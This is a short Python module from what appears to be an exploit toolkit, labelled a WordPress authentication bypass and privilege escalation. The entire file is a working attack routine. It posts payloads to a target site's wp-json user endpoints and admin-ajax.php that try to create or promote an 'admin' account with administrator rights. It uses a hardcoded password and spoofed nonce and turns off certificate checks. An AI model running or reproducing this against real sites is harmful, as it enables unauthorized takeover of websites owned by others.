import requests
from core.printmodels import *
import json

class WordPress_Auth_Bypass_2023:
    def __init__(self):
        self.name = "WordPress Auth Bypass 2023"
        self.description = "WordPress Authentication Bypass and Privilege Escalation"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-WP-Nonce': 'DrDataYE'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "username": "admin",
                    "email": "admin@local.host",
                    "password": "DrDataYE123!",
                    "roles": ["administrator"]
                },
                {
                    "user_login": "admin",
                    "role": "administrator",
                    "meta": {"wp_capabilities": {"administrator": True}}
                }
            ]

            endpoints = [
                f"{site}/wp-json/wp/v2/users",
                f"{site}/wp-json/wp/v2/users/me",
                f"{site}/wp-admin/admin-ajax.php"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code in [200, 201] and ('capabilities' in response.text or 'administrator' in response.text):
                        return PrintSuccess(f"[WP-Auth-2023] Vulnerable! Auth bypass successful at {endpoint}")

            return PrintFailed("[WP-Auth-2023] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[WP-Auth-2023] Error: {str(e)}")
